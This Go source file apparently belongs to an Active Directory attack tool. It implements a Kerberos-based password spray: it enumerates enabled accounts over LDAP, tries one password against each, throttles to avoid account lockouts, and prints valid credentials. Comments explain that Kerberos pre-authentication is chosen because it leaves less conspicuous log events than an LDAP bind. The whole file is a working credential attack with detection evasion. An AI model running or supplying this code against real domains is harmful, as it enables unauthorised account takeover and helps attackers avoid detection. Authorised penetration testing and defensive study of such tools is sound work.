package attacks

import (
	"context"
	"fmt"
	"strings"
	"time"

	"adreaper/internal/config"
	"adreaper/internal/output"
	"adreaper/internal/recon"
)

// SprayResult holds a successful credential pair.
type SprayResult struct {
	Username string
	Password string
	Domain   string
}

// Spray performs a password spray with lockout-aware throttling.
// It checks the domain lockout policy first and refuses if threshold risk is detected.
func Spray(ctx context.Context, opts *config.Options, password, usersFile string, delaySec int) ([]SprayResult, error) {
	// Step 1: Check lockout policy via LDAP
	ldapCl, err := recon.NewLDAPClient(opts)
	if err != nil {
		// Try unauthenticated if no creds given for spray
		output.Warn("LDAP not available for lockout check — proceeding carefully")
	} else {
		defer ldapCl.Close()
		info, err := ldapCl.QueryDomainInfo(ctx)
		if err == nil && info.LockoutThreshold > 0 {
			output.Warn("Domain lockout threshold: %d attempts", info.LockoutThreshold)
			output.Warn("Observation window: %s", info.ObservationWindow)
			if info.LockoutThreshold <= 3 {
				output.Critical("LOCKOUT THRESHOLD IS ≤ 3! Spraying is HIGH RISK of locking accounts.")
				output.Critical("Enforcing minimum delay of 30s between attempts.")
				if delaySec < 30 {
					delaySec = 30
				}
			}
		}
	}

	// Step 2: Load or enumerate usernames
	var usernames []string
	if usersFile != "" {
		usernames, err = LoadUsersFile(usersFile)
		if err != nil {
			return nil, fmt.Errorf("load users file: %w", err)
		}
	} else {
		// Enumerate from LDAP
		if ldapCl == nil {
			return nil, fmt.Errorf("no --users-file and LDAP not available")
		}
		users, err := ldapCl.QueryUsers(ctx)
		if err != nil {
			return nil, err
		}
		for _, u := range users {
			if u.Enabled {
				usernames = append(usernames, u.SAMAccountName)
			}
		}
	}

	if len(usernames) == 0 {
		return nil, fmt.Errorf("no usernames to spray")
	}

	output.Info("Spraying %d accounts with delay=%ds between attempts", len(usernames), delaySec)
	output.Info("Password: %s", password)
	output.Warn("This will generate authentication events in the Security Event Log!")

	// Step 3: Spray via Kerberos AS-REQ (stealthier than LDAP bind)
	var results []SprayResult
	for i, username := range usernames {
		select {
		case <-ctx.Done():
			return results, ctx.Err()
		default:
		}

		if i > 0 {
			time.Sleep(time.Duration(delaySec) * time.Second)
		}

		valid, err := testCredentials(opts, username, password)
		if err != nil {
			// Ignore per-user errors (disabled accounts, etc.)
			continue
		}
		if valid {
			result := SprayResult{Username: username, Password: password, Domain: opts.Domain}
			results = append(results, result)
			output.Critical("VALID: %s\\%s : %s", opts.Domain, username, password)
		} else {
			if opts.Verbose {
				output.Info("  FAILED: %s", username)
			}
		}
	}
	return results, nil
}

// testCredentials attempts an unauthenticated Kerberos AS-REQ with the given password.
// This is stealthier than LDAP bind (Event 4768 vs 4624).
func testCredentials(opts *config.Options, username, password string) (bool, error) {
	testOpts := &config.Options{
		Domain:      opts.Domain,
		DCIP:        opts.DCIP,
		Username:    username,
		Password:    password,
		LDAPPort:    opts.LDAPPort,
		LDAPTimeout: opts.LDAPTimeout,
		UseLDAPS:    opts.UseLDAPS,
		KDCAddr:     opts.KDCAddr,
		SMBPort:     opts.SMBPort,
	}

	cl, err := recon.NewKerberosClient(testOpts)
	if err != nil {
		errStr := strings.ToLower(err.Error())
		// Kerberos error for bad password: "KDC_ERR_PREAUTH_FAILED" (24)
		if strings.Contains(errStr, "preauth_failed") || strings.Contains(errStr, "integrity check on decrypted field failed") {
			return false, nil
		}
		// Account locked out: "KDC_ERR_CLIENT_REVOKED" (18)
		if strings.Contains(errStr, "client_revoked") || strings.Contains(errStr, "locked out") {
			return false, fmt.Errorf("account %s is locked out: %w", username, err)
		}
		return false, err
	}
	cl.Close()
	return true, nil
}
